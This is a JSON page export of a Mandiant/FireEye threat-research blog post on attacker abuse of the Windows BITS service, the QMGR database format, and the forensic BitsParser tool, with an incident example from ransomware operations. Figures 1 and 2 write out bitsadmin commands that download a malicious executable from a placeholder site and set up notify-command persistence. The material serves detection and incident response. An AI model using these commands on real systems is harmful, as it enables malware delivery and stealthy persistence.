{
  "jcr:primaryType": "cq:Page",
  "jcr:createdBy": "admin",
  "jcr:created": "Wed Mar 31 2021 14:58:36 GMT+0000",
  "jcr:content": {
    "jcr:primaryType": "cq:PageContent",
    "jcr:mixinTypes": [
      "mix:versionable"
    ],
    "jcr:createdBy": "admin",
    "jcr:title": "Back in a Bit: Attacker Use of the Windows Background Intelligent Transfer Service",
    "jcr:versionHistory": "bb446697-16f3-4b5d-8743-e197c050a4b4",
    "author": "David Via",
    "cq:template": "\/apps\/fireeye-blog\/templates\/page_blogpost",
    "jcr:language": "en_us",
    "jcr:predecessors": [
      "12cbafaa-caf2-4e35-8913-1bacb3396617"
    ],
    "jcr:created": "Wed Mar 31 2021 14:58:36 GMT+0000",
    "cq:lastModified": "Wed Mar 31 2021 14:57:26 GMT+0000",
    "jcr:baseVersion": "12cbafaa-caf2-4e35-8913-1bacb3396617",
    "jcr:isCheckedOut": true,
    "cq:tags": [
      "fireeye-blog-authors:david-via",
      "fireeye-blog-authors:scott-runnels",
      "fireeye-blog-threat-research:threat-research",
      "fireeye-blog-tags:homepage-carousel",
      "fireeye-blog-tags:latest",
      "fireeye-blog-tags:windows",
      "fireeye-blog-tags:detection",
      "fireeye-blog-tags:bits"
    ],
    "jcr:uuid": "20c8db08-6d04-45e5-a628-da2de7cd2f14",
    "sling:resourceType": "social\/blog\/components\/page",
    "published": "Wed Mar 31 2021 11:00:00 GMT-0400",
    "cq:lastModifiedBy": "adam.greenberg@fireeye.com",
    "par": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "entry": {
        "jcr:primaryType": "nt:unstructured",
        "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
        "text": "\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003EIn this blog post we will describe:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EHow attackers use the Background Intelligent Transfer Service (BITS)\u003C\/li\u003E\n\u003Cli\u003EForensic techniques for detecting attacker activity with data format specifications\u003C\/li\u003E\n\u003Cli\u003EPublic release of the \u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/github.com\/fireeye\/BitsParser\u0022\u003EBitsParser\u003C\/a\u003E tool\u003C\/li\u003E\n\u003Cli\u003EA real-world example of malware using BITS persistence\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Ch4\u003EIntroduction\u003C\/h4\u003E\n\u003Cp\u003EMicrosoft introduced the Background Intelligent Transfer Service (BITS) with Windows XP to simplify and coordinate downloading and uploading large files. Applications and system components, most notably Windows Update, use BITS to deliver operating system and application updates so they can be downloaded with minimal user disruption.\u003C\/p\u003E\n\u003Cp\u003EApplications interact with the Background Intelligent Transfer Service by creating jobs with one or more files to download or upload. The BITS service runs in a service host process and can schedule transfers to occur at any time. Job, file, and state information is stored in a local database.\u003C\/p\u003E\n\u003Ch4\u003EHow Attackers Use BITS\u003C\/h4\u003E\n\u003Cp\u003EAs is the case with many technologies, BITS can be used both by legitimate applications and by attackers. When malicious applications create BITS jobs, files are downloaded or uploaded in the context of the service host process. This can be useful for evading firewalls that may block malicious or unknown processes, and it helps to obscure which application requested the transfer. BITS transfers can also be scheduled allowing them to occur at specific times without relying on long-running processes or the task scheduler.\u003C\/p\u003E\n\u003Cp\u003EBITS transfers are asynchronous, which can result in situations where the application that created a job may not be running when the requested transfers complete. To address this scenario BITS jobs can be created with a user-specified notification command, which will be executed after the job completes or in case of errors. The notification commands associated with BITS jobs can specify any executable or command to run. Attackers have utilized this feature as a method for maintaining persistence of malicious applications.\u003C\/p\u003E\n\u003Cp\u003ESince the command data for BITS jobs is stored to a database rather than traditional registry locations, it can be overlooked by tools that attempt to identify persistence executables and commands or by forensic investigators.\u003C\/p\u003E\n\u003Cp\u003EBITS jobs can be created using API function calls or via the bitsadmin command line tool. See Figure 1 and Figure 2 for an example of how a BITS job can be used to download a file and trigger execution.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00220\u0022 cellspacing=\u00220\u0022 width=\u0022100%\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026gt; bitsadmin \/create download\u003Cbr\u003E\n \u0026gt; bitsadmin \/addfile download https:\/\/\u0026lt;site\u0026gt;\/malware.exe c:\\windows\\malware.exe\u003Cbr\u003E\n \u0026gt; bitsadmin \/resume download\u003Cbr\u003E\n \u0026gt; bitsadmin \/complete download\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003ECreated job {EA8603EB-7CC2-44EC-B1EE-E9923290C2ED}.\u003Cbr\u003E\n Added https:\/\/\u0026lt;site\u0026gt;\/malware.exe -\u0026gt; c:\\windows\\malware.exe to job.\u003Cbr\u003E\n Job resumed.\u003Cbr\u003E\n Job completed.\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 1: Using bitsadmin to create a job that downloads a malicious executable and stores it to c:\\windows\\malware.exe.\u003C\/span\u003E\u003C\/p\u003E\n\u003Ctable cellpadding=\u00220\u0022 cellspacing=\u00220\u0022 width=\u0022100%\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026gt; bitsadmin \/create persistence\u003Cbr\u003E\n \u0026gt; bitsadmin \/addfile persistence http:\/\/127.0.0.1\/invalid.exe c:\\windows\\i.exe\u003Cbr\u003E\n \u0026gt; bitsadmin \/SetNotifyCmdLine persistence c:\\windows\\malware.exe NULL\u003Cbr\u003E\n \u0026gt; bitsadmin \/resume persistence\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/back-in-a-bit\/Fig2.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 2: Using bitsadmin to create a job that will launch malware.exe after attempting to download an invalid URL.\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003ECreating BitsParser\u003C\/h4\u003E\n\u003Cp\u003EThrough our investigations, Mandiant consultants identified evidence of attackers leveraging BITS across multiple campaigns. In order to search for evidence of attacker use of BITS, we needed to understand the underlying infrastructure used by BITS and create a tool that could collect relevant information.\u003C\/p\u003E\n\u003Cp\u003EWe created \u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/github.com\/fireeye\/BitsParser\u0022\u003EBitsParser\u003C\/a\u003E, which parses BITS databases and returns information about jobs executed on endpoint systems. The tool can be run internally by Mandiant consultants via our endpoint agent allowing BITS data to be acquired from many hosts across an enterprise. BitsParser has been successfully used in many investigations to uncover attacker downloads, uploads, and persistence.\u003C\/p\u003E\n\u003Cp\u003EIn order to process the custom database format, BitsParser utilizes the open source \u003Ca href=\u0022https:\/\/github.com\/ANSSI-FR\/bits_parser\u0022\u003EANSSI-FR\u003C\/a\u003E library. The library allows parsing of both active and deleted entries from BITS database files, and it can fully extract relevant information from job and file records.\u003C\/p\u003E\n\u003Ch4\u003EThe QMGR Database\u003C\/h4\u003E\n\u003Cp\u003EBITS jobs and associated state information are stored in local \u201cqueue manager\u201d (QMGR) database files in the \u003Cspan class=\u0022code\u0022\u003E%ALLUSERSPROFILE%\\Microsoft\\Network\\Downloader\u003C\/span\u003E directory. The database is stored to files named qmgr0.dat and qmgr1.dat. The two-file scheme appears to be used for back up and synchronization purposes. The second file largely contains duplicate job and file information, though some unique or older entries can be found in the file.\u003C\/p\u003E\n\u003Ch4\u003EWindows 10 Changes\u003C\/h4\u003E\n\u003Cp\u003EThe Background Intelligent Transfer Service has largely remained unchanged since its introduction. However, Windows 10 introduced significant changes to the service, including an all new database format. On Windows 10 the QMGR database is stored using the Extensible Storage Engine (ESE) format. ESE databases have been used in many other Microsoft products including Exchange, Active Directory, and Internet Explorer.\u003C\/p\u003E\n\u003Cp\u003EWindows 10 stores the QMGR database in a single file called \u003Cspan class=\u0022code\u0022\u003Eqmgr.db\u003C\/span\u003E. Separate transaction log files are maintained in the same directory. The most recent transaction log is stored to a file called \u003Cspan class=\u0022code\u0022\u003Eedb.log\u003C\/span\u003E, and three older transaction logs with numerical suffixes are typically present.\u003C\/p\u003E\n\u003Ch4\u003EParsing ESE Databases\u003C\/h4\u003E\n\u003Cp\u003EIn order to support investigations on Windows 10 systems, we updated the BitsParser tool to support the new QMGR database format. To accomplish this, we needed a Python-based ESE database parser. Research led us to \u003Ca href=\u0022https:\/\/github.com\/libyal\/libesedb\u0022\u003Elibesedb\u003C\/a\u003E, which is a full ESE database implementation written in C with a Python wrapper. With no other Python options available, we initially used libesedb in BitsParser to parse the Windows 10 QMGR database. However, we sought a solution that did not rely on native executables and would be more compact for improved efficiency in large scale deployments.\u003C\/p\u003E\n\u003Cp\u003EThe only pure Python ESE database implementation we identified was part of the \u003Ca href=\u0022https:\/\/github.com\/SecureAuthCorp\/impacket\u0022\u003EImpacket\u003C\/a\u003E network toolset. Although the source code could perform basic database enumeration, it lacked key features, including the ability to process long values. Since the QMGR database includes entries large enough to require long values, modification of the Impacket implementation was required. We adapted the Impacket ESE database parsing code to make it more robust and support all features necessary for parsing QMGR databases. The full Python solution allows database parsing in a much smaller package without the risks and limitations of native code.\u003C\/p\u003E\n\u003Ch4\u003EDatabase Structure\u003C\/h4\u003E\n\u003Cp\u003EThe Windows 10 QMGR database contains two tables: Jobs and Files. Both tables have two columns: Id and Blob. The Id contains a GUID to identify the entry, and the Blob contains binary data which defines the job or file. Fortunately, the job and file structures are largely unchanged from the previous database format.\u003C\/p\u003E\n\u003Cp\u003EJob data starts with the control structure:\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022300\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u002277\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EOffset\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022156\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EField\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003ESize\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002277\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E0\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022156\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EType\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E4\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002277\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E4\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022156\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EPriority\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E4\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002277\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E8\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022156\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EState\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E4\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002277\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E...\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022156\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002277\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E16\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022156\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EJob ID (GUID)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E16\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002277\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E32\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022156\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EName (UTF-16)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Evariable\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002277\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Evariable\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022156\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EDescription (UTF-16)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Evariable\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002277\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Evariable\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022156\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ECommand (UTF-16)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Evariable\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002277\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Evariable\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022156\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EArguments (UTF-16)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Evariable\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002277\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Evariable\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022156\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EUser SID (UTF-16)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Evariable\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002277\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Evariable\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022156\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EFlags\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E4\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EFollowing the control structure is a list of files delimited by the XFER GUID, {7756DA36-516F-435A-ACAC-44A248FFF34D}. The list begins with a 4-byte file count followed by a list of GUIDs, which correspond to Id values in the Files table.\u003C\/p\u003E\n\u003Cp\u003EThe file data uses the following structure:\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022282\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022215\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EField\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003ESize\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022215\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EDestination Filename (UTF-16)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Evariable\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022215\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ESource Filename (UTF-16)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Evariable\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022215\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ETemporary Filename (UTF-16)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Evariable\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022215\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EDownload Size\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E8\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022215\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ETransfer Size\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E8\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022215\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Ci\u003Eunknown\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E1\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022215\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EDrive (UTF-16)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Evariable\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022215\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EVolume GUID (UTF-16)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002267\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Evariable\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EThe database is processed by enumerating entries in the Jobs table, parsing each job data, finding correlated files, and parsing the corresponding records in the Files table. This allows the BitsParser to combine related information and output jobs with their associated files including relevant metadata.\u003C\/p\u003E\n\u003Ch4\u003ERecovering Deleted Records\u003C\/h4\u003E\n\u003Cp\u003EActive jobs have entries in the Jobs and Files tables. Records are deleted upon job completion or cancellation. As with other filesystem and data formats, deleted entries are not immediately overwritten and can often be recovered for some time after deletion.\u003C\/p\u003E\n\u003Cp\u003EThe following algorithm is used to recover deleted jobs and files from Windows 10 QMGR databases:\u003C\/p\u003E\n\u003Col\u003E\n\u003Cli\u003ELocate file records by searching for the file identifier GUID, {519ECFE4-D946-4397-B73E-268513051AB2}. Attempt to parse the following data as a normal file record.\u003C\/li\u003E\n\u003Cli\u003ELocate job records by searching for job identifier GUIDs. Attempt to parse the following data as a normal job record. Handle incomplete job entries by parsing just the control structure and manually locate associated files if required.\u003Cbr\u003E\nThe following job GUIDs have been observed in QMGR databases:\u003Col\u003E\n\u003Cli\u003E{E10956A1-AF43-42C9-92E6-6F9856EBA7F6}\u003C\/li\u003E\n\u003Cli\u003E{4CD4959F-7064-4BF2-84D7-476A7E62699F}\u003C\/li\u003E\n\u003Cli\u003E{A92619F1-0332-4CBF-9427-898818958831}\u003C\/li\u003E\n\u003Cli\u003E{DDBC33C1-5AFB-4DAF-B8A1-2268B39D01AD}\u003C\/li\u003E\n\u003Cli\u003E{8F5657D0-012C-4E3E-AD2C-F4A5D7656FAF}\u003C\/li\u003E\n\u003Cli\u003E{94416750-0357-461D-A4CC-5DD9990706E4}\u003C\/li\u003E\n\u003C\/ol\u003E\n\u003C\/li\u003E\n\u003Cli\u003ECorrelate carved file records to carved jobs. Process all remaining carved file records that could not be correlated to active or deleted jobs.\u003C\/li\u003E\n\u003C\/ol\u003E\n\u003Cp\u003EHistoric records can also be found in transaction log files. Although we do not parse the transaction log structures, the same algorithm can be used to find job and file records within the logs by searching for appropriate GUIDs. While the same records may be present in multiple files, duplicates can be suppressed to prevent output of redundant information.\u003C\/p\u003E\n\u003Ch4\u003EBitsParser Tool Release\u003C\/h4\u003E\n\u003Cp\u003EAt the time of writing we are not aware of any open source tools available to parse BITS databases and extract data useful for incident response and forensic investigations. To help address this and foster further research, FireEye has decided to release a standalone version of BitsParser. This command line utility can process all versions of BITS databases and perform carving to recover deleted job and file information.\u003C\/p\u003E\n\u003Cp\u003ESource code for BitsParser can be found at our \u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/github.com\/fireeye\/BitsParser\u0022\u003EGitHub page\u003C\/a\u003E.\u003C\/p\u003E\n\u003Cp\u003ENote that on Windows 10 the QMGR database files are opened without sharing by the BITS service thus preventing other programs from directly opening them. When BitsParser is deployed via the FireEye endpoint agent it can directly parse the local filesystem and raw read files in circumstances where they cannot be directly read. The standalone BitsParser does not have this ability. The BITS service should be stopped prior to running BitsParser or third-party tools for copying locked files may be utilized.\u003C\/p\u003E\n\u003Ch4\u003EBITS Persistence in the Wild\u003C\/h4\u003E\n\u003Cp\u003EIn 2020 Mandiant responded to many incidents involving Ryuk ransomware operators leveraging custom backdoors and loaders to actively target hospitals and other medical support centers (see our blog post \u003Ca href=\u0022\/content\/fireeye-www\/en_US\/blog\/threat-research\/2020\/10\/kegtap-and-singlemalt-with-a-ransomware-chaser.html\u0022 adhocenable=\u0022false\u0022\u003EUnhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser\u003C\/a\u003E). Through numerous engagements Mandiant was able to profile the attacker\u0027s Tools Techniques and Procedures (TTPs) and identify unique aspects of the various backdoors and loaders that were leveraged prior to encryption. In one such engagement, Mandiant consultants had mapped the vast majority of the attack timeline from initial exploitation to the encryption of corporate resources and an extortion demand. Log analysis and telemetry provided by the customer\u0027s on-premises endpoint detection solution led to the identification of a KEGTAP backdoor on an end-user workstation. Mandiant was able to identify the specific email and lure used by the ransomware operators including the download and execution of the file \u003Cspan class=\u0022code\u0022\u003Email.exe\u003C\/span\u003E, which launched KEGTAP. However, none of the persistence mechanisms that Mandiant observed in other engagements were present on this endpoint.\u003C\/p\u003E\n\u003Cp\u003EA full understanding of the persistence mechanism would allow Mandiant to hunt for additional evidence of attacker activity across the environment and in other engagements. As focus intensified, Mandiant consultants identified evidence to indicate that the BITS service launched the KEGTAP backdoor. Analysts identified entries in the Microsoft-Windows-Bits-Client operational event log which associated the BITS service activity with the file \u003Cspan class=\u0022code\u0022\u003Email.exe\u003C\/span\u003E.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00220\u0022 cellspacing=\u00220\u0022 width=\u0022100%\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E3 | Information | The BITS service created a new job: System update, with owner REDACTED\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E61 | Warning | BITS stopped transferring the System update transfer job that is associated with the http:\/\/127.0.0.1\/tst\/56\/ URL. The status code is 2147954429.\u0026nbsp;\u0026nbsp;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E64 | Warning | The BITS job System update is configured to launch C:\\Users\\REDACTED\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\REDACTED\\mail.exe after transfer of http:\/\/127.0.0.1\/tst\/12\/. The service failed to launch the program with error 2147942402, BITS will continue trying to launch the program periodically until it succeeds.\u0026nbsp;\u0026nbsp;\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 3: Event log entries showing the creation of a BITS job for persistence\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EMandiant consultants were able to confirm the details of the BITS job by interacting with the host and examining the QMGR database. The malicious BITS job was set to attempt an HTTP transfer of a nonexistent file from the local host. As this file would never exist, BITS would trigger the error state and launch the notify command, which in this case was KEGTAP.\u003C\/p\u003E\n\u003Cp\u003EUnfortunately, while this was successful in identifying a previously unknown persistence mechanism associated with this threat group, manual QMGR database analysis would not scale across multiple systems or environments. Adapting the existing BitsParser to parse the Windows 10 version of the QMGR database enabled Mandiant consultants to efficiently identify additional infected systems across multiple environments.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00220\u0022 cellspacing=\u00220\u0022 width=\u0022100%\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003E{\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026quot;JobType\u0026quot;: \u0026quot;download\u0026quot;,\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026quot;JobPriority\u0026quot;: \u0026quot;normal\u0026quot;,\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026quot;JobState\u0026quot;: \u0026quot;queued\u0026quot;,\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026quot;JobName\u0026quot;: \u0026quot;System update\u0026quot;,\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026quot;CommandExecuted\u0026quot;: \u0026quot;C:\\\\Users\\\\REDACTED\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\REDACTED\\\\mail.exe\u0026quot;,\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026quot;Files\u0026quot;: [\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026quot;DestFile\u0026quot;: \u0026quot;C:\\\\Users\\\\REDACTED\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\REDACTED\\\\mail.exe\u0026quot;,\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026quot;SourceURL\u0026quot;: \u0026quot;http:\/\/127.0.0.1\/tst\/56\/\u0026quot;,\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026quot;DownloadByteSize\u0026quot;: 0\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; }\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; ]\u003Cbr\u003E\n }\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 4: BitsParser output shows the malicious BITS job launching mail.exe\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EConclusion\u003C\/h4\u003E\n\u003Cp\u003EThe Background Intelligent Transfer Service continues to provide utility to applications and attackers alike. The BITS QMGR database can present a useful source of data in an investigation or hunting operation. \u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/github.com\/fireeye\/BitsParser\u0022\u003EBitsParser\u003C\/a\u003E may be utilized with other forensic tools to develop a detailed view of attacker activity.\u003C\/p\u003E\n",
        "jcr:lastModified": "Wed Mar 31 2021 14:55:58 GMT+0000",
        "sling:resourceType": "social\/blog\/components\/entrytext"
      }
    },
    "summary": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
